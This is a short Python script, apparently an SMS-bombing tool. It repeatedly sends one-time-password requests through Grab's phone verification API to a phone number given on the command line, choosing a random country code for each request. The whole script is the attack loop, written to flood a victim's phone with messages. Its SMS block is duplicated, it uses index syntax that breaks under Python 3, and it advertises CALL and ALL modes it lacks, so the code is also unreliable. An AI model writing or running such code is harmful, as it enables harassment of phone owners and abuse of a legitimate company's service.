import requests
import sys
import time
import random

fewlist = sys.argv

fewofgod = 1

cooldown = int(fewlist[03])

if fewlist[02] == "SMS":
    while fewofgod <= cooldown:
        fewza = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM')
        print("Send Country [" + random.choice(fewza) + "]")
        r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) +'&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
        fewofgod = fewofgod+1
        time.sleep(1)
if fewlist[02] == "SMS":
    while fewofgod <= cooldown:
        fewza = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM')
        print("Send Country [" + random.choice(fewza) + "]")
        r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) +'&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
        fewofgod = fewofgod+1
        time.sleep(1)
else:
    print("Fail Choice [SMS,CALL,ALL]")
